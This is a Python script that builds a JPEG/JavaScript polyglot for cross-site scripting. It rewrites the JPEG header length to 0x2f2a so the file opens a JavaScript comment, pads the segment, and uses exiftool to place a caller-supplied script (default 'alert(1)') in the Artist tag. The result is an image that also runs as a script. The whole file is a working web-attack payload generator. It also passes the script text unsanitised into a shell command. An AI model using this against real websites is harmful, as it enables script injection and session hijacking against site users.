import os
import sys
import struct
from PIL import Image
 

class JPEG_header():	 

	def __init__(self, byte):

		self.byte = byte
		self.parse()
	
	def parse(self):

		self.SOI = self.byte[:2]
		self.APP0 = self.byte[2:4]
		self.Length = struct.unpack('>H',self.byte[4:6])[0]
		self.Identifier = self.byte[6:11]
		self.JFIF_version = self.byte[11:13]
		self.Density_units = self.byte[13:14]
		self.Xdensity = self.byte[14:16]
		self.Ydensity = self.byte[16:18]
		self.Xthumbnail = self.byte[18:19]
		self.Ythumbnail = self.byte[19:20]
		self.Thum_or_pad = self.byte[20:4 + self.Length]
		self.others = self.byte[4 + self.Length:]

	def make(self, size):

		self.padding = size - self.Length
		prev = self.SOI + self.APP0 + struct.pack('>H',size) + self.Identifier + self.JFIF_version + self.Density_units + self.Xdensity + self.Ydensity + self.Xthumbnail + self.Ythumbnail + self.Thum_or_pad
		self.result = prev + (b"\x00" * self.padding) + self.others + b"*/"

	def save(self, name):

		f = open(name, "wb")
		f.write(self.result)
		f.close()

if __name__ == '__main__':

	if(len(sys.argv)  < 2):

		exif('python3 xss_jpeg.py "alert(1)" 120 120')
	try:

		xSize = int(sys.argv[2])
		ySize = int(sys.argv[3])

	except:
		xSize = 120
		ySize = 120

	script = sys.argv[1]

	img = Image.new('RGB', (120, 120), color = 'red')
	img.save('temp.jpeg')
	
	image = open('temp.jpeg', 'rb').read()

	jpeg = JPEG_header(image)
	jpeg.make(0x2f2a)
	jpeg.save("xss.jpeg")
	
	os.system('exiftool -artist="*/=({})/*" xss.jpeg'.format(script))
	os.system('rm temp.jpeg xss.jpeg_original')

